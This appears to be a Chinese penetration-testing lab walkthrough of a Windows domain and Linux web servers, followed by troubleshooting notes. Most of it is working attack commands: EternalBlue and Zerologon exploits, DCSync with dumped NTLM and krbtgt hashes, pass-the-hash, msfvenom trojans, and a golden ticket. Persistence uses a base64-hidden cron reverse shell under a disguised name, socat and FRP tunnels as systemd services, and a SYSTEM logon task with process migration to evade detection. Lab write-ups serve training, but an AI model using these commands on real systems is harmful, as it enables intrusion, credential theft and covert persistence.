在 Kali 终端启动 msfconsole
```
search ms17_010      #查找相关模块

```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-01-25-54.png)

选择利用的模块路径并配置好参数
```
use auxiliary/scanner/smb/smb_ms17_010    
set RHOSTS 192.168.93.40
run
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-09-49-44.png)
发现确实存在永恒之蓝漏洞可以利用

#### 漏洞利用
>MS17-010永恒之蓝拿下PC1的shell
在 Kali 终端启动 msfconsole
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.93.40
set Proxies socks5:127.0.0.1:12345
set payload windows/x64/meterpreter/bind_tcp	# 内网机器回连不到 Kali，必须用 bind_tcp
set LPORT 4447
run
```

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-57-58.png)
利用成功，获取一个会话
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-59-05.png)
system权限不需要提权



### DC
#### 漏洞探测

- **端口扫描**
   ```
   nmap -sS -Pn --min-rate 1000 -p- 192.168.93.30
   ```
   ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-20-45-24.png)

- **利用脚本验证是否存在zerologon（CVE-2020-1472）漏洞**

  ```
   python3 zerologon_tester.py DC 192.168.93.30
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-20-58-51.png)
  存在该漏洞

#### 漏洞利用
- **清空域控机器账户密码**
  ```
  python3 cve-2020-1472-exploit.py DC 192.168.93.30
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-21-01-14.png)
  执行成功，DC01$ 的密码即为空。

- **DCSync 导出域管哈希**
  ```
  impacket-secretsdump -no-pass -just-dc WHOAMIANONY/DC\$@192.168.93.30 
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-17-18.png)

  ```
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:ab89b1295e69d353dd7614c7a3a80cec:::
  ```

- **WMI利用**

  ```
  impacket-wmiexec whoamianony.org/Administrator\@192.168.93.30 -hashes :ab89b1295e69d353dd7614c7a3a80cec	

  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-30-42.png)
  成功获取DC机器的shell
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-01-31-39.png)
  administrator权限
## msf上线

- **web1上线msf**
  生成木马文件
  ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.162.128 LPORT=4444 -f elf -o web1_shell.elf
  ```
  msf上监听4444端口等待web1连接
  ```
  msfconsole
  use exploit/multi/handler
  set payload linux/x86/meterpreter/reverse_tcp
  set LHOST 192.168.162.128
  set LPORT 4444
  run
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-01-55-02.png)
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-01-56-50.png)

- **添加通往52网段的路由**

  ```
  run autoroute -s 192.168.52.0/24
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-10-23.png)
  让 MSF 开启一个 SOCKS 代理
  ```
  meterpreter > background  # 把 session 1 放到后台
  use auxiliary/server/socks_proxy
  set SRVPORT 1080
  run -j
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-11-03.png)
  
- **web2**
  ```
  msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=192.168.52.20 LPORT=6666 -f elf -o web2_bind.elf
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-35-48.png)
  ```
  use exploit/multi/handler
  set payload linux/x86/meterpreter/reverse_tcp
  set LHOST 192.168.162.128
  set LPORT 6666
  run
  ```
  web2下载并运行木马
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-45-10.png)
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-44-33.png)
  上线成功
- **添加通往93网段的路由**
  ```
  run autoroute -s 192.168.93.0/24
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-48-19.png)
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-49-04.png)
- **pc1**
  pc1是通过msf木马获取shell的也已经在msf中上线了
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-06-22-57.png)
- **PC2**
  PC2本来就是通过msf利用永恒之蓝拿下的，已经上线msf了
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-02-55-11.png)

## 持久化
### 隧道持久化——级联 FRP

**持久化结构图**

>Kali:9051 -> Web1:9052 -> Web1:7001 -> Web2:frpc -> Web2 (93网段网卡) -> 最终目标

- kali侧：启动 frps 服务端
  ```toml
  bindPort = 7000    
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-14-48-24.png)
  ```bash
  ./frps -c frps.toml
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-14-48-44.png)
  Kali 会监听 7000 端口，等待 Web1 来连接


  - 修改 Kali 的 /etc/proxychains4.conf，此时 Kali 本地会拥有两个代理端口：9050 对应 52 网段，9051 对应 93 网段。根据目标切换即可
    ```
    [ProxyList]
    # 访问 52 网段时用这个：
    socks5 127.0.0.1 9050
    # 访问 93 网段时换成这个（记得注释掉上面那行）：
    # socks5 127.0.0.1 9051
    ```
     
- Web1 侧配置
  核心中转站——Web1 现在要身兼两职：既是 Kali 的客户端（frpc），又是 Web2 的服务端（frps）

  - web1配置并启动 frpc 客户端
    ```toml
    # 客户端连接服务端的配置
    serverAddr = "192.168.162.128"
    serverPort = 7000

    # --- 52 网段代理 ---
    [[proxies]]
    name = "socks5_proxy_52"
    type = "tcp"
    remotePort = 9050
    [proxies.plugin]
    type = "socks5"

    # --- 把 Web1 的 9052 端口（Web2代理端口）暴露给 Kali 的 9051 ---
    [[proxies]]
    name = "web2_proxy_forward"
    type = "tcp"
    localIP = "127.0.0.1"
    localPort = 9052
    remotePort = 9051

    # 接力 Web2 发来的反向 Shell 流量 ---
    [[proxies]]
    name = "web1_relay_4444"
    type = "tcp"
    localIP = "127.0.0.1"
    localPort = "4444"    # 接收 Web2 刚刚映射到本地的 4444 端口
    remotePort = "4444"   # 最终映射到 Kali 的 4444 端口

    [[proxies]]
    name = "web1_relay_4445"
    type = "tcp"
    localIP = "127.0.0.1"
    localPort = "4445"    # 接收 Web2 刚刚映射到本地的 4445 端口
    remotePort = "4445"   # 最终映射到 Kali 的 4445 端口
    ``` 

    ```bash
    ./frpc -c frpc.toml
    ```
  - 把frpc启动命令写入systemd服务实现开机自启动
    /etc/systemd/system/frp-forward.service 
    ```
    [Unit]
    Description=Network Forwarding (frp-tunnel) Service
    After=network-online.target
    Wants=network-online.target


    [Service]
    Type=simple
    ExecStart=/frpc -c /frpc.toml
    Restart=always
    RestartSec=10
    User=root

    [Install]
    WantedBy=multi-user.target    
    ``` 

    ```
    systemctl enable frp-forward.service 
    systemctl start frp-forward.service 
    systemctl status frp-forward.service 
    ```
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-29-25.png)
  - Web1 配置 frps 服务端
    ```
    bindPort = 7001
    ``` 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-24-25.png)
    启动命令
    ```
    frps -c frps.toml
    ```
    配置成systemd服务
    /etc/systemd/system/frp-server.service 
    ```
    [Unit]
    Description=Network Forwarding (frp-server) Service
    After=network-online.target
    Wants=network-online.target


    [Service]
    Type=simple
    ExecStart=/frps -c /frps.toml
    Restart=always
    RestartSec=10
    User=root

    [Install]
    WantedBy=multi-user.target    
    ``` 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-25-23.png)

  - 把frps启动命令写入systemd服务实现开机自启动
    /etc/systemd/system/frp-server.service 
    ```
    [Unit]
    Description=Network Forwarding (frp-server) Service
    After=network-online.target
    Wants=network-online.target


    [Service]
    Type=simple
    ExecStart=/frps -c /frps.toml
    Restart=always
    RestartSec=10
    User=root

    [Install]
    WantedBy=multi-user.target    
    ``` 

    ```
    systemctl enable frp-server.service 
    systemctl start frp-server.service 
    systemctl status frp-server.service 
    ```
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-36-38.png)

- Web2 侧配置（93网段的出口）
  Web2 上只需要运行 frpc 去连接 Web1 的 frps

  - 配置frpc.toml
    ```
    serverAddr = "192.168.52.10" # 连 Web1 的 52 网段 IP
    serverPort = 7001            # 连 Web1 刚刚开的 frps 端口

    # 开启 93 网段的 socks5 代理
    [[proxies]]
    name = "socks5_proxy_93"
    type = "tcp"
    remotePort = 9052 # 注意：这里在 Web1 的本地会监听 9052
    [proxies.plugin]
    type = "socks5"

    # --- 增加：用于接收 93 网段反向 Shell 并转发给上游的配置 ---
    [[proxies]]
    name = "web2_reverse_4444_PC1"
    type = "tcp"
    localIP = "127.0.0.1"

    remotePort = "4444"   # 这是 Web1 上将被占用的端口，因为 Web1 需要接收 Web2 的请求

    [[proxies]]
    name = "web2_reverse_4445_PC2"
    type = "tcp"
    localIP = "127.0.0.1"
    remotePort = "4445"   # 这是 Web1 上将被占用的端口，因为 Web1 需要接收 Web2 的请求

    ``` 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-40-47.png)
  - 把frpc启动命令写入systemd服务实现开机自启动
    /etc/systemd/system/frp-proxy.service 
    ```
    [Unit]
    Description=Network Forwarding (93-proxy) Service
    After=network-online.target
    Wants=network-online.target


    [Service]
    Type=simple
    ExecStart=/frpc -c /frpc.toml
    Restart=always
    RestartSec=10
    User=root

    [Install]
    WantedBy=multi-user.target    
    ``` 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-44-42.png)

    ```
    systemctl enable frp-proxy.service  
    systemctl start frp-proxy.service 
    systemctl status frp-proxy.service 
    ```
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-17-47-14.png)

测试连通性
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-23-03-32.png)
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-23-17-52.png)
没问题

### 端口转发持久化
>要保证内网机器上的msf木马可以反向连接kali就需要进行端口转发持久化操作

- **端口转发总览**
  ```
  pc1——>web1:6001——>kali:3001
  pc2——>web2:8002——>web1——>6002——>kali:3002
  DC——>web2:8003——>web:6003——>kali:3003
  ```
- **创建脚本`/usr/local/bin/port-translate.sh
`写入端口转发命令榜加上执行权限**
  - web1
    ```
    #!/bin/bash
    nohup socat TCP4-LISTEN:6001,bind=192.168.52.10,reuseaddr,fork TCP4:192.168.162.128:3001 > /dev/null 2>&1 &

    nohup socat TCP4-LISTEN:6002,bind=192.168.52.10,reuseaddr,fork TCP4:192.168.162.128:3002 >/dev/null 2>&1 &

    nohup socat TCP4-LISTEN:6003,bind=192.168.52.10,reuseaddr,fork TCP4:192.168.162.128:3003 >/dev/null 2>&1 &

    wait
    ```
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-03-43-21.png)
  - web2
    ```
    #!/bin/bash
    nohup socat TCP4-LISTEN:8002,bind=192.168.93.10,reuseaddr,fork TCP4:192.168.52.10:6002 > /dev/null 2>&1  &

    nohup socat TCP4-LISTEN:8003,bind=192.168.93.10,reuseaddr,fork TCP4:192.168.52.10:6003 >/dev/null 2>&1 &

    wait
    ```

- **将脚本写入systemd服务实现持久化**   
  /etc/systemd/system/port-translate.service
  - web1
    ```
    [Unit]
    Description=Socat Forward
    After=network.target  # 网络启动后运行

    [Service]
    Type=simple
    ExecStart=/usr/local/bin/port-translate.sh
    Restart=always  # 确保崩溃后重启
    User=root

    [Install]
    WantedBy=multi-user.target
    ``` 
  - web2  
    ```
    [Unit]
    Description=Socat Forward
    After=network.target  # 网络启动后运行

    [Service]
    Type=simple
    ExecStart=/usr/local/bin/port-translate.sh
    Restart=always  # 确保崩溃后重启
    User=root

    [Install]
    WantedBy=multi-user.target
    ``` 
  **启用并启动服务**
  ```
  systemctl daemon-reload
  systemctl enable port-translate.service
  systemctl start port-translate.service
  systemctl status port-translate.service
  ```
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-03-51-45.png)
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-04-07-31.png)

### Web1（DMZ）
- 连接持久化：反弹shell定时任务(主动连接kali的2345端口)
  - 利用Linux 计划任务 (crontab) 和 Base64 编码
    ```
    echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2Mi4xMjgvMjM0NSAwPiYx | base64 -d | bash' > /usr/local/bin/update-mgr.sh
    chmod +x /usr/local/bin/update-mgr.sh
    ``` 
  - 加入定时任务，每分钟唤醒
    ```
    (crontab -l; echo "* * * * * /usr/local/bin/update-mgr.sh") | crontab -
    ``` 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-30-14.png)

  - 检验定时任务是否工作正常
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-32-51.png)
  kali监听2345端口后一会就有反弹shell建立成功

- web2反弹shell通道持久化：socat 转发自启动
  
  - 创建 /etc/systemd/system/net-forward.service
    ```
    [Unit]
    Description=Network Forwarding (52->kali) Service
    After=network-online.target
    Wants=network-online.target


    [Service]
    # listen port 1234 and forward to kali:1234
    Type=simple
    ExecStart=/usr/bin/socat TCP4-LISTEN:1234,fork TCP4:192.168.162.128:1234
    Restart=always
    RestartSec=10
    User=root

    [Install]
    WantedBy=multi-user.target
    ``` 
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-19-14.png)
    ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-13-18-32.png)


### Web2
连接持久化——定时任务：反弹后门（主动连接kali的1234端口）
```
echo 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEwLzEyMzQgMD4mMQo= | base64 -d | bash' > /usr/local/bin/update-mgr.sh
chmod +x /usr/local/bin/update-mgr.sh
(crontab -l; echo "* * * * * /usr/local/bin/update-mgr.sh") | crontab -
``` 
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-43-17.png)

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-49-40.png)
kali监听1234后成功连接上反弹shell




### PC1/pc2
>pc2和pc1思路一致，这里只写pc1
>将msf木马伪装成systemd服务实现自启动
>在用户登陆系统时自动以SYSTEM权限运行木马

- 生成msf木马并上传到pc1
  ```
  msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.52.10 lport=6001 -f exe -o PC2_backdoor.exe
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-42-43.png)

- 通过msf本身的指令创建服务
  ```
  meterpreter > execute -f cmd.exe -a "/c schtasks /create /tn SystemMaintenance /tr C:\Windows\System32\pc1_sync.exe /sc onlogon /ru SYSTEM /f"
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-43-11.png)
- 为防止被查杀，可将木马注入系统进程
  ```
  meterpreter > migrate -N explorer.exe
  ``` 
  ![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-05-44-18.png)

### DC
**黄金票据**
根据前面获取的凭据和信息
```

WHOAMIANONY / S-1-5-21-1315137663-3706837544-1429009142

krbtgt的NTLM哈希：6be58bfcc0a164af2408d1d3bd313c2a
```

使用msf
```
kiwi_cmd "kerberos::golden /user:Administrator /domain:WHOAMIANONY.ORG /sid:S-1-5-21-1315137663-3706837544-1429009 /krbtgt:6be58bfcc0a164af2408d1d3bd313c2a /ptt"
```
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-06-39-00.png)
查看注入的票据
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-21-06-41-58.png)
注入成功
## 遇到的问题

### 网络连接问题
**现象**

网卡配置没问题但是web1 ping不通pc1，pc1也ping不通web1

**解决方法**

pc1的网络适配器1我设置成了VMnet10，网络适配器2我设置成了VMnet9，此时pc1与web1无法通信
把网络适配器1我设置成了VMnet9，网络适配器2设置成了VMnet10，此时pc1与web1就可以正常通信了

**原因**

- 在 VMware 的底层，一个 VMnet 就是一台独立的虚拟二层交换机。

  - 比如 VMnet10 是一台交换机，VMnet9 是另一台交换机。

  - 它们之间默认是不通网线的

  - Web1 的内网网卡选了 VMnet10，PC1 的内网网卡选了 VMnet10，就等于把这两台机器的网线，插在了同一台叫 VMnet10 的交换机上。

  - 只要它们在同一个交换机上，且 IP 在同一个网段（192.168.52.0/24），它们就能直接通过 ARP 广播找到对方的 MAC 地址，实现二层互通

- 虚拟机的系统（比如 Windows 里的“本地连接 1（网络适配器1）”、“本地连接 2（网络适配器2）”）不知道自己插在哪个交换机上，它只认自己配了什么 IP。

  - 如果系统把 52 网段的 IP 配给了“本地连接 1”，但 VMware 底层把“本地连接 1”接到了 VMnet10（93网段的交换机）上。

  - 这时候系统一发数据，就走错了门，跑到 93 网段的交换机上去了，52 网段的机器自然收不到，就会报“目标主机不可达”。

  - 调换适配器，本质上是把网线重新插回了正确的交换机。

### 高版本哥斯拉连接问题

**现象**
用 EXP 脚本打出来的 Shell，用常规的哥斯拉（Godzilla）死活连不上

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-03-12-51.png)

**原因**
由于红日靶场 Web2 的 Laravel 环境版本特殊，网上的 EXP 脚本（比如 SecPros-Team 那个）是写死的，它利用 Laravel 漏洞时，会在目标服务器上生成一个特定版本的哥斯拉加密马（通常适配哥斯拉 2.x 版本）。现在手里的哥斯拉连不上，说明两边加密算法或通信协议对不上

**解决方法**
核心思路是利用 phpggc 生成一条恶意的序列化 POC，让目标服务器在触发漏洞时，顺便执行一段系统命令，这段命令负责下载并写入一个最新版（4.0）的哥斯拉木马



### 中文乱码问题

**现象**
在 MSF 获取到 Windows 主机（PC1）的 shell 后出现中文乱码

**原因**
最常见的原因是 Windows 命令行的默认编码（GBK）与 Kali 终端使用的 UTF-8 编码不一致。

**解决方法**
将 Windows 命令行的活动代码页切换为 UTF-8，从而让中文能够正常显示。
```
chcp 65001
```

### 环境变量无法修改

**现象**
在劫持环境变量时发现环境变量习修改不了

**原因**
可能是shell的问题（Webshell不稳定），通过蚁剑、菜刀等 Webshell 管理工具的命令执行功能来运行这些命令，每一条命令都可能在一个独立的、非交互式的子 Shell 中执行。export 的效果无法传递到下一个命令的进程里

**解决方法**

获取反弹 Shell（Reverse Shell）

- 环境连贯：反弹 Shell 给你的是一段持续的连接，在里面执行 export，变量会保留在当前进程的内存里，下一条命令能立刻读到。

- 规避受限：如果是受限的 Webshell 终端，反弹 Shell 直接建立了一个新的 TCP 连接，脱离原有的 Web 服务上下文，通常能直接拿到完整的交互式 Bash。


### 为什么已经有了明文账号密码还需要写入ssh公钥
>主要是为了稳定、隐蔽和方便

1. 突破密码登录的限制（最核心原因）
   很多现代 Linux 系统（比如 Ubuntu）默认配置里，禁止 root 用户直接用密码登录 SSH（PermitRootLogin prohibit-password）。如果只拿密码，你直接用 ssh root@192.168.52.20 可能会被拒绝。但写入公钥后，只要开启了密钥登录，往往就能直接进。

2. 为了走代理（Proxychains）更方便
   现在处于内网环境，要连 192.168.52.20，大概率是要挂代理（Proxychains）的。

   如果是密码登录：你每次连都要经过代理，网络一卡，或者代理链一抖，输入密码就超时了，还得重头再来。

   如果是公钥登录：直接 proxychains4 ssh -i id_rsa root@192.168.52.20，一气呵成，不需要交互，非常丝滑。

3. 做持久化后门（权限维持）
   假设系统管理员发现了 Web 漏洞并修补了，甚至重置了密码，之前拿到的密码就失效了。但只要提前把公钥写进了 authorized_keys，私钥依然能随时登进去。这是标准的“留后门”操作。

4. 密码的局限性
   - 机器爆破：有些内网机器上，密码可能是不允许 SSH 登录的（比如 Web 端数据库密码，或者只允许特定用户 SSH）。

   - 其他服务：就算不写公钥用密码登进去了，有时候要去跑 Ansible、自动化脚本做内网横向时，免密登录是基础。

### 在kali中ssh公钥认证登录web2失败

**现象**
在kali中尝试用ssh秘钥认证方式登录web2，但是认证失败了

![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-19-07-21-09.png)

**原因**

Kali 和 Web2 之间无法协商出一致的签名算法。

- Kali 客户端：OpenSSH_10.3p1（非常新）

- Web2 服务端：OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13（非常老，Ubuntu 14.04 时代的版本）

- Kali 的 OpenSSH 版本（8.8 及以上）默认禁用了 ssh-rsa 签名算法（基于 SHA-1），因为它已不安全。而你的 Web2 服务端太老，很可能只支持这种旧的 ssh-rsa 算法。

- 结果就是：客户端说“我不玩 ssh-rsa 了”，服务端说“我只会 ssh-rsa”，双方谈不拢，公钥认证直接失败，然后回退到密码认证。

**解决方法**

命令执行时指定参数：在 ssh 命令中加上 -o PubkeyAcceptedKeyTypes=+ssh-rsa 参数
```
proxychains4 ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /root/.ssh/id_rsa ubuntu@192.168.52.20
```

### 创建持久化服务时报错

**现象**

给web1创建net-forward.service时报错Exec format error

**原因**

socat 没有写绝对路径，ExecStart需要绝对路径，不能用相对路径

**解决方法**

修复方法：把 socat 改成它的完整路径


### 配置52网段代理持久化时连不上web2的ssh

**现象**

web1和kali都配置好并启动frp后，使用proxychains4连接web2的ssh但是连不上
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-26-21.png)

**原因**

经过排查frp 隧道和 SOCKS5 代理是完好的，且 Web2 的 22 端口也是完全开放的。时因为proxychains4 配置问题。
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-35-42.png)
在/etc/proxychains4.conf中[ProxyList]中有其他的代理，导致proxychains 把 SSH 连接目标错误地解析成了 0.0.0.0:12349，而不是 192.168.52.20:22。这导致代理试图去连接一个不存在的地址，自然就超时并返回 Connection refused 了

- *多代理链的机制*：proxychains4 在 [ProxyList] 里写多行代理时，默认是串联（链式）的。如果不注释掉，它会尝试先连 A，再用 A 连 B，最后用 B 去访问目标。

- *dynamic_chain* 的“并发”陷阱：如果在配置文件的头部开启了 dynamic_chain，proxychains 会尝试同时去连列表里的所有代理。如果其中某个代理（比如如果配置中有 socks5 0.0.0.0 12349 或类似的失效代理）不可用，它就会在这个节点卡住或报错。

**解决方法**

把多余的代理注释掉只留127.0.0.1 9050这个代理
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-16-37-07.png)

**另外**

- 如果是单层代理，用 strict_chain 最稳

- 如果是多层代理（比如 Kali -> 代理A -> 代理B -> 目标），需要用到 dynamic_chain。

### 使用proxychains4进行nmap扫描时失败

**现象**

配置好代理后用proxychains4转发请求对93网段进行nmap扫描时全都显示失败或超时
![](https://raw.githubusercontent.com/ethicalpaws/obsidian-img/main/2026-10-20-23-21-06.png)

**原因**

- nmap 默认会用原始套接字、ICMP 或 UDP 来探测主机，而 SOCKS5 代理（proxychains 走的就是它）只支持 TCP，一旦 nmap 试图发非 TCP 的包，就会在代理层直接失败并显示超时。

- 虽然加了 -sT（TCP Connect 扫描）和 -Pn（跳过主机发现），但 nmap 在以 root 权限运行时，依然会尝试用底层原始套接字去做一些辅助探测，从而触发问题
  
**解决方法**

在命令里加上 --unprivileged 参数，强制 nmap 完全放弃原始套接字，只走普通的 TCP 连接：

```bash
proxychains4 nmap -sT -Pn --unprivileged 192.168.93.40
```

### 